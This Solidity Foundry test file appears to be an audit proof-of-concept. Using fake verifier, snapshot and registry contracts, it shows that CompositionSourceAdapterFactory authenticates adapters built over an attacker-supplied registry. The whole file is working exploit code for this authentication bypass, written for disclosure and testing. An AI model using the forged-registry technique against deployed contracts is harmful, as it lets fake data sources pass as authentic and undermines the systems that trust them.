// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";

import {
    CompositionSourceAdapter,
    CompositionSourceAdapterFactory
} from "src/composition/CompositionSourceAdapter.sol";
import {IInstanceRegistry} from "interfaces/registry/IInstanceRegistry.sol";

contract FakeVerifier {
    function programVKey() external pure returns (bytes32) {
        return keccak256("whatever-vkey");
    }
}

contract FakeSnapshot {
    function provenanceEnabled() external pure returns (bool) {
        return true;
    }
}

/// @notice An attacker-authored contract that satisfies `IInstanceRegistry` for exactly one id.
contract FakeRegistry {
    address public snap;
    address public ver;

    constructor(address s, address v) {
        snap = s;
        ver = v;
    }

    function getInstance(bytes32) external view returns (IInstanceRegistry.Instance memory) {
        return IInstanceRegistry.Instance({
            program: keccak256("trust-graph"),
            snapshot: snap,
            verifier: ver,
            registryOrAccumulator: address(0xdead),
            paramsHash: keccak256("fake-params")
        });
    }

    function paramsAuthority(bytes32) external view returns (address) {
        return address(this);
    }
}

/// @notice PASS A PoC.
///
/// `CompositionSourceAdapterFactory.create` takes the `IInstanceRegistry` as a CALLER-SUPPLIED
/// argument, performs no check that it is the canonical chain registry, and then records
/// `isAdapter[adapter] = true`. `CompositionSourceAccumulator._validatePolicy`'s only
/// authenticity test is `adapterFactory.isAdapter(adapterAddress)`, so the "append-only
/// authenticity registry" the contract header claims — "an ABI-compatible lookalike is rejected"
/// — admits an adapter built over a registry the attacker wrote.
contract OmegaPassA_AdapterFactoryAuthenticity is Test {
    function test_PassA_AnyoneCanMintAnAuthenticatedAdapterOverAForgedRegistry() public {
        CompositionSourceAdapterFactory factory = new CompositionSourceAdapterFactory();

        FakeSnapshot snap = new FakeSnapshot();
        FakeVerifier ver = new FakeVerifier();
        FakeRegistry reg = new FakeRegistry(address(snap), address(ver));

        CompositionSourceAdapter adapter = factory.create(
            IInstanceRegistry(address(reg)),
            keccak256("any-id"),
            keccak256("source"),
            keccak256("family"),
            keccak256("allocation"),
            keccak256("looks-reviewed")
        );

        // The forged adapter is now indistinguishable from a real one at the only gate that
        // exists.
        assertTrue(factory.isAdapter(address(adapter)), "forged adapter is authenticated");
        assertEq(adapter.snapshot(), address(snap));
        assertEq(adapter.registry() == IInstanceRegistry(address(reg)) ? 1 : 0, 1);
    }
}
